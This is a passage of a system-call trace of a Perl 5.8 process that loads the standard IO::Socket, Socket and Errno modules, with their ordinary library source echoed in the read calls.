$domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
12268 07:41:34.919985 stat64("/etc/perl/Socket.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.920000 stat64("/etc/perl/Socket.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.920013 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.920026 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.920039 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.920051 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.920076 stat64("/usr/lib/perl5/Socket.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.920122 stat64("/usr/lib/perl5/Socket.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.920152 stat64("/usr/share/perl5/Socket.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.920181 stat64("/usr/share/perl5/Socket.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.920212 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.920225 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
12268 07:41:34.920277 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
12268 07:41:34.920327 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bff88) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.920354 _llseek(8, 0, [0], SEEK_CUR) = 0
12268 07:41:34.920407 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
12268 07:41:34.921328 brk(0x8239000)    = 0x8239000
12268 07:41:34.921612 read(8, "", 4096) = 0
12268 07:41:34.921631 close(8)          = 0
12268 07:41:34.921719 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
12268 07:41:34.921745 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12268 07:41:34.921772 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
12268 07:41:34.921786 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
12268 07:41:34.921964 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
12268 07:41:34.921984 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d18000
12268 07:41:34.921998 mmap2(0xb7d1d000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7d1d000
12268 07:41:34.922015 close(8)          = 0
12268 07:41:34.922628 brk(0x825a000)    = 0x825a000
12268 07:41:34.922776 stat64("/etc/perl/Errno.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.922793 stat64("/etc/perl/Errno.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.922806 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.922819 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.922852 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.922856 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.922856 stat64("/usr/lib/perl5/Errno.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.922857 stat64("/usr/lib/perl5/Errno.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.922857 stat64("/usr/share/perl5/Errno.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.922857 stat64("/usr/share/perl5/Errno.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.922857 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.922858 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
12268 07:41:34.922858 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
12268 07:41:34.922858 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bff88) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.922858 _llseek(8, 0, [0], SEEK_CUR) = 0
12268 07:41:34.922858 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
12268 07:41:34.923599 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
12268 07:41:34.924027 _llseek(8, 5966, [5966], SEEK_SET) = 0
12268 07:41:34.924045 _llseek(8, 0, [5966], SEEK_CUR) = 0
12268 07:41:34.924055 close(8)          = 0
12268 07:41:34.924396 brk(0x827b000)    = 0x827b000
12268 07:41:34.924569 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
12268 07:41:34.925045 _llseek(6, 6698, [6698], SEEK_SET) = 0
12268 07:41:34.925062 _llseek(6, 0, [6698], SEEK_CUR) = 0
12268 07:41:34.925072 close(6)          = 0
12268 07:41:34.925091 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925105 stat64("/etc/perl/IO/Socket/INET.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925119 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925132 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925146 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925159 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.925174 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
